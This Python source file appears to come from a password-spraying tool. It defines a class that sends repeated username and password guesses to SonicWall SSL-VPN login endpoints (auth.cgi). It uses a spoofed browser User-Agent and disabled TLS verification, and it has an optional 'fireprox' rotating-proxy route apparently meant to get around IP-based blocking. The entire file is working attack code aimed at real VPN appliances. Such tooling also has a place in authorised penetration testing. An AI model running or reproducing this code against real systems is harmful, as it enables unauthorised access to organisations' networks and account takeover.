import requests

from .classes.BaseHttpTarget import BaseHttpTarget


class Sonicwall(BaseHttpTarget):
    """Password spray Sonicwall VPN appliances"""

    def __init__(self, host, port, timeout, fireprox):
        self.domain = input("Enter domain: ")
        self.timeout = timeout
        self.url = f"https://{host}:{port}/auth.cgi"

        if fireprox:
            self.url = f"https://{fireprox}/fireprox/auth.cgi"

        self.cookies = {"temp": ""}

        self.headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Referer": f"https://{host}:{port}/sslvpnLogin.html",
            "Content-Type": "application/x-www-form-urlencoded",
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1",
        }
        self.data = {
            "id": "8f",
            "domain": self.domain,
            "uName": "user",
            "pass": "pass",
            "SslvpnLoginPage": "1",
            "digest": "",
        }

        """
        # proxy settings
        self.http_proxy  = "http://127.0.0.1:8080"
        self.https_proxy = "http://127.0.0.1:8080"
        self.ftp_proxy   = "http://127.0.0.1:8080"

        self.proxyDict = {
              "http"  : self.http_proxy,
              "https" : self.https_proxy,
              "ftp"   : self.ftp_proxy
        }
        """

    def set_username(self, username):
        self.data["uName"] = username
        self.username = username

    def set_password(self, password):
        self.data["pass"] = password
        self.password = password

    def login(self, username, password):
        # set data
        self.set_username(username)
        self.set_password(password)
        # post the request
        response = requests.post(
            self.url,
            headers=self.headers,
            cookies=self.cookies,
            data=self.data,
            timeout=self.timeout,
            verify=False,
        )  # , proxies=self.proxyDict)
        return response
